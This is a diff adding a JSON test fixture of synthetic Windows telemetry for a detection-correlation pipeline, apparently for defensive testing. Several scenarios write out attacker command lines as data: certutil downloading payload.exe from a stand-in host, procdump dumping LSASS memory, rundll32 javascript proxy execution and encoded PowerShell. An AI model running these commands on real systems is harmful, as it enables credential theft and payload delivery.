@@ -1,0 +1,198 @@
+{
+  "fixture_id": "phase2-correlation-scenarios",
+  "description": "Hand-authored, deterministic raw-telemetry replay fixture (gate G2.3). Same DetectionReplayFixture format G1.2/G1.3 already use (attribution_platform.replay.detection_fixtures) -- no new fixture type. No scenario here asserts a rule id, a correlation dimension, or a group -- what fires (against fixtures/phase1_core_rules.json, unmodified) and how the resulting Evidence/Observation pairs correlate (via the real G2.1/G2.2 engines) is decided entirely by the pipeline evaluating these scenarios, never declared by the fixture itself. Twelve named scenario groups (prefixed g1..g12 on every scenario_id) exercise all three structural dimensions and all five contextual dimensions -- see tests/test_replay_correlation.py for the exact expected invariant per group. Not real detection-engineering content; not used to validate detection efficacy or attribution correctness.",
+  "scenarios": [
+    {
+      "scenario_id": "g1-cmd",
+      "raw_record": { "record_id": "evt-g1-cmd", "timestamp": "2026-03-01T09:00:00+00:00", "observation_id": "obs-g1-cmd" },
+      "process": { "name": "cmd.exe", "parent_name": "WINWORD.EXE", "entity_id": "proc-g1-cmd", "parent_entity_id": "proc-g1-winword" },
+      "host": { "id": "host-g1" }
+    },
+    {
+      "scenario_id": "g1-certutil",
+      "raw_record": { "record_id": "evt-g1-certutil", "timestamp": "2026-03-01T09:01:00+00:00", "observation_id": "obs-g1-certutil" },
+      "process": { "name": "certutil.exe", "command_line": "certutil.exe -urlcache -split -f http://example.invalid/payload.exe payload.exe", "entity_id": "proc-g1-certutil", "parent_entity_id": "proc-g1-cmd" },
+      "host": { "id": "host-g1" }
+    },
+
+    {
+      "scenario_id": "g2-shared",
+      "raw_record": { "record_id": "evt-g2-shared", "timestamp": "2026-03-01T09:02:00+00:00", "observation_id": "obs-g2-shared" },
+      "process": { "name": "procdump.exe", "command_line": "procdump.exe -ma lsass.exe C:\\temp\\lsass.dmp" },
+      "event": { "action": "user-logon" },
+      "host": { "id": "host-g2" }
+    },
+
+    {
+      "scenario_id": "g3-rundll-a",
+      "raw_record": { "record_id": "evt-g3-rundll-a", "timestamp": "2026-03-01T09:03:00+00:00", "observation_id": "obs-g3-rundll-a" },
+      "process": { "name": "rundll32.exe", "command_line": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";alert('x')", "entity_id": "proc-g3-rundll" },
+      "host": { "id": "host-g3" }
+    },
+    {
+      "scenario_id": "g3-rundll-b",
+      "raw_record": { "record_id": "evt-g3-rundll-b", "timestamp": "2026-03-01T09:04:00+00:00", "observation_id": "obs-g3-rundll-b" },
+      "process": { "name": "rundll32.exe", "command_line": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";alert('x')", "entity_id": "proc-g3-rundll" },
+      "host": { "id": "host-g3" }
+    },
+
+    {
+      "scenario_id": "g4-ps",
+      "raw_record": { "record_id": "evt-g4-ps", "timestamp": "2026-03-01T09:05:00+00:00", "observation_id": "obs-g4-ps" },
+      "process": { "name": "powershell.exe", "command_line": "powershell.exe -enc SGVsbG8gV29ybGQh", "entity_id": "proc-g4-ps" },
+      "host": { "id": "host-g4" }
+    },
+    {
+      "scenario_id": "g4-procdump",
+      "raw_record": { "record_id": "evt-g4-procdump", "timestamp": "2026-03-01T09:06:00+00:00", "observation_id": "obs-g4-procdump" },
+      "process": { "name": "procdump.exe", "command_line": "procdump.exe -ma lsass.exe C:\\temp\\lsass.dmp", "entity_id": "proc-g4-procdump" },
+      "host": { "id": "host-g4" }
+    },
+    {
+      "scenario_id": "g4-certutil",
+      "raw_record": { "record_id": "evt-g4-certutil", "timestamp": "2026-03-01T09:07:00+00:00", "observation_id": "obs-g4-certutil" },
+      "process": { "name": "certutil.exe", "command_line": "certutil.exe -urlcache -split -f http://example.invalid/payload.exe payload.exe", "entity_id": "proc-g4-certutil" },
+      "host": { "id": "host-g4" }
+    },
+
+    {
+      "scenario_id": "g5-rundll",
+      "raw_record": { "record_id": "evt-g5-rundll", "timestamp": "2026-03-01T09:08:00+00:00", "observation_id": "obs-g5-rundll" },
+      "process": { "name": "rundll32.exe", "command_line": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";alert('x')", "entity_id": "proc-g5-rundll" },
+      "host": { "id": "host-g5a" },
+      "user": { "id": "admin-shared-g5" }
+    },
+    {
+      "scenario_id": "g5-ps",
+      "raw_record": { "record_id": "evt-g5-ps", "timestamp": "2026-03-01T09:09:00+00:00", "observation_id": "obs-g5-ps" },
+      "process": { "name": "powershell.exe", "command_line": "powershell.exe -enc SGVsbG8gV29ybGQh", "entity_id": "proc-g5-ps" },
+      "host": { "id": "host-g5b" },
+      "user": { "id": "admin-shared-g5" }
+    },
+
+    {
+      "scenario_id": "g6-certutil",
+      "raw_record": { "record_id": "evt-g6-certutil", "timestamp": "2026-03-01T09:10:00+00:00", "observation_id": "obs-g6-certutil" },
+      "process": { "name": "certutil.exe", "command_line": "certutil.exe -urlcache -split -f http://example.invalid/payload.exe payload.exe", "entity_id": "proc-g6-certutil" },
+      "host": { "id": "host-g6a" },
+      "network": { "destination": { "ip": "203.0.113.9" } }
+    },
+    {
+      "scenario_id": "g6-ps",
+      "raw_record": { "record_id": "evt-g6-ps", "timestamp": "2026-03-01T09:11:00+00:00", "observation_id": "obs-g6-ps" },
+      "process": { "name": "powershell.exe", "command_line": "powershell.exe -enc SGVsbG8gV29ybGQh", "entity_id": "proc-g6-ps" },
+      "host": { "id": "host-g6b" },
+      "network": { "destination": { "ip": "203.0.113.9" } }
+    },
+
+    {
+      "scenario_id": "g7-rundll",
+      "raw_record": { "record_id": "evt-g7-rundll", "timestamp": "2026-03-01T09:12:00+00:00", "observation_id": "obs-g7-rundll" },
+      "process": { "name": "rundll32.exe", "command_line": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";alert('x')", "entity_id": "proc-g7-rundll" },
+      "host": { "id": "host-g7a", "name": "WKS-SHARED-7" }
+    },
+    {
+      "scenario_id": "g7-ps",
+      "raw_record": { "record_id": "evt-g7-ps", "timestamp": "2026-03-01T09:13:00+00:00", "observation_id": "obs-g7-ps" },
+      "process": { "name": "powershell.exe", "command_line": "powershell.exe -enc SGVsbG8gV29ybGQh", "entity_id": "proc-g7-ps" },
+      "host": { "id": "host-g7b", "name": "WKS-SHARED-7" }
+    },
+
+    {
+      "scenario_id": "g8-certutil",
+      "raw_record": { "record_id": "evt-g8-certutil", "timestamp": "2026-03-01T09:14:00+00:00", "observation_id": "obs-g8-certutil" },
+      "process": { "name": "certutil.exe", "command_line": "certutil.exe -urlcache -split -f http://example.invalid/payload.exe payload.exe", "entity_id": "proc-g8-certutil" },
+      "host": { "id": "host-g8a" },
+      "user": { "id": "user-g8a", "name": "jdoe-8" }
+    },
+    {
+      "scenario_id": "g8-ps",
+      "raw_record": { "record_id": "evt-g8-ps", "timestamp": "2026-03-01T09:15:00+00:00", "observation_id": "obs-g8-ps" },
+      "process": { "name": "powershell.exe", "command_line": "powershell.exe -enc SGVsbG8gV29ybGQh", "entity_id": "proc-g8-ps" },
+      "host": { "id": "host-g8b" },
+      "user": { "id": "user-g8b", "name": "jdoe-8" }
+    },
+
+    {
+      "scenario_id": "g9a-cmd",
+      "raw_record": { "record_id": "evt-g9a-cmd", "timestamp": "2026-03-01T09:16:00+00:00", "observation_id": "obs-g9a-cmd" },
+      "process": { "name": "cmd.exe", "parent_name": "WINWORD.EXE", "entity_id": "proc-g9-cmdA", "parent_entity_id": "proc-g9-winwordA" },
+      "host": { "id": "host-g9" },
+      "user": { "id": "user-g9" }
+    },
+    {
+      "scenario_id": "g9a-certutil",
+      "raw_record": { "record_id": "evt-g9a-certutil", "timestamp": "2026-03-01T09:17:00+00:00", "observation_id": "obs-g9a-certutil" },
+      "process": { "name": "certutil.exe", "command_line": "certutil.exe -urlcache -split -f http://example.invalid/payload.exe payload.exe", "entity_id": "proc-g9-certutilA", "parent_entity_id": "proc-g9-cmdA" },
+      "host": { "id": "host-g9" },
+      "user": { "id": "user-g9" }
+    },
+    {
+      "scenario_id": "g9b-shared",
+      "raw_record": { "record_id": "evt-g9b-shared", "timestamp": "2026-03-01T09:18:00+00:00", "observation_id": "obs-g9b-shared" },
+      "process": { "name": "procdump.exe", "command_line": "procdump.exe -ma lsass.exe C:\\temp\\lsass.dmp" },
+      "event": { "action": "user-logon" },
+      "host": { "id": "host-g9" },
+      "user": { "id": "user-g9" }
+    },
+
+    {
+      "scenario_id": "g10-ps",
+      "raw_record": { "record_id": "evt-g10-ps", "timestamp": "2026-03-01T09:19:00+00:00", "observation_id": "obs-g10-ps" },
+      "process": { "name": "powershell.exe", "command_line": "powershell.exe -enc SGVsbG8gV29ybGQh", "entity_id": "proc-g10-ps" },
+      "host": { "id": "host-g10" },
+      "user": { "id": "user-g10" }
+    },
+    {
+      "scenario_id": "g10-certutil",
+      "raw_record": { "record_id": "evt-g10-certutil", "timestamp": "2026-03-01T09:20:00+00:00", "observation_id": "obs-g10-certutil" },
+      "process": { "name": "certutil.exe", "command_line": "certutil.exe -urlcache -split -f http://example.invalid/payload.exe payload.exe", "entity_id": "proc-g10-certutil" },
+      "host": { "id": "host-g10" },
+      "user": { "id": "user-g10" }
+    },
+
+    {
+      "scenario_id": "g11-cmd",
+      "raw_record": { "record_id": "evt-g11-cmd", "timestamp": "2026-03-01T09:21:00+00:00", "observation_id": "obs-g11-cmd" },
+      "process": { "name": "cmd.exe", "parent_name": "WINWORD.EXE", "entity_id": "proc-g11-cmd", "parent_entity_id": "proc-g11-winword" },
+      "host": { "id": "host-g11" }
+    },
+    {
+      "scenario_id": "g11-certutil",
+      "raw_record": { "record_id": "evt-g11-certutil", "timestamp": "2026-03-01T09:22:00+00:00", "observation_id": "obs-g11-certutil" },
+      "process": { "name": "certutil.exe", "command_line": "certutil.exe -urlcache -split -f http://example.invalid/payload.exe payload.exe", "entity_id": "proc-g11-certutil", "parent_entity_id": "proc-g11-cmd" },
+      "host": { "id": "host-g11" }
+    },
+    {
+      "scenario_id": "g11-procdump",
+      "raw_record": { "record_id": "evt-g11-procdump", "timestamp": "2026-03-01T09:23:00+00:00", "observation_id": "obs-g11-procdump" },
+      "process": { "name": "procdump.exe", "command_line": "procdump.exe -ma lsass.exe C:\\temp\\lsass.dmp", "entity_id": "proc-g11-procdump", "parent_entity_id": "proc-g11-cmd" },
+      "host": { "id": "host-g11" }
+    },
+
+    {
+      "scenario_id": "g12a-cmd",
+      "raw_record": { "record_id": "evt-g12a-cmd", "timestamp": "2026-03-01T09:24:00+00:00", "observation_id": "obs-g12a-cmd" },
+      "process": { "name": "cmd.exe", "parent_name": "WINWORD.EXE", "entity_id": "proc-g12-cmdA", "parent_entity_id": "proc-g12-winwordA" },
+      "host": { "id": "host-g12" }
+    },
+    {
+      "scenario_id": "g12a-certutil",
+      "raw_record": { "record_id": "evt-g12a-certutil", "timestamp": "2026-03-01T09:25:00+00:00", "observation_id": "obs-g12a-certutil" },
+      "process": { "name": "certutil.exe", "command_line": "certutil.exe -urlcache -split -f http://example.invalid/payload.exe payload.exe", "entity_id": "proc-g12-certutilA", "parent_entity_id": "proc-g12-cmdA" },
+      "host": { "id": "host-g12" }
+    },
+    {
+      "scenario_id": "g12b-cmd",
+      "raw_record": { "record_id": "evt-g12b-cmd", "timestamp": "2026-03-01T09:26:00+00:00", "observation_id": "obs-g12b-cmd" },
+      "process": { "name": "cmd.exe", "parent_name": "EXCEL.EXE", "entity_id": "proc-g12-cmdB", "parent_entity_id": "proc-g12-winwordB" },
+      "host": { "id": "host-g12" }
+    },
+    {
+      "scenario_id": "g12b-procdump",
+      "raw_record": { "record_id": "evt-g12b-procdump", "timestamp": "2026-03-01T09:27:00+00:00", "observation_id": "obs-g12b-procdump" },
+      "process": { "name": "procdump.exe", "command_line": "procdump.exe -ma lsass.exe C:\\temp\\lsass.dmp", "entity_id": "proc-g12-procdumpB", "parent_entity_id": "proc-g12-cmdB" },
+      "host": { "id": "host-g12" }
+    }
+  ]
+}
